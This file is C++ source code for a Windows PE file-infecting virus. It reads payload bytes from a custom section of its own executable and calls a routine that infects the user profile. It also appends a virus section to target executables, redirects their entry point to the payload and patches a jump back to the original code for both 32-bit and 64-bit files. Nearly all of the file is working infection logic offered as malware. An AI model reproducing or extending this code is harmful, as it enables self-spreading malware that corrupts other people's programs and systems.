#include "virus/virus.h"
#include "pe/pecpp.h"

#include <fstream>
#include <filesystem>
#include <vector>

#define OFFSET

int main();

std::vector<unsigned char> section_data_global;

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
{
    DWORD virus_va_in_target;
    DWORD virus_ra_in_target;

    DWORD target_entry_point = GetEntryPoint(file_data);

    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data_global.data(), (DWORD)section_data_global.size(), data);

    virus_va_in_target = virus_section_in_target->VirtualAddress;
    virus_ra_in_target = virus_section_in_target->PointerToRawData;

    if (Is64BitExecutable(file_data))
    {
        DWORD entry_point_64bit = *(DWORD *)&section_data_global[4]; //0x28F0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
                                            entry_point_64bit + 0x55 //0x2945//
                ) = target_entry_point - (virus_va_in_target + 
                                            entry_point_64bit + 0x59 // 0x2949
                                ); 
    }
    else
    {
        DWORD entry_point_32bit = *(DWORD *)&section_data_global[0]; //0xca0;
        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
                                            entry_point_32bit + 0x3c //0xcdc
                ) = target_entry_point - (virus_va_in_target + 
                                            entry_point_32bit + 0x40 // 0xce0
                                        );
    }

    *(DWORD*)new_file_size = (DWORD)file_size + (DWORD)section_data_global.size();
    return;
}


int main()
{

	char buf[MAX_PATH];
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    std::string current_file = buf;

    pe::PortableExecutable exe(current_file);
    section_data_global = exe.GetSectionData(".hieu").data;

    IAT iat;
    DATA data;
    data.iat = &iat;
    GetFunctionAddresses(&data);
    InfectUserProfile(&data);
    return 0;
}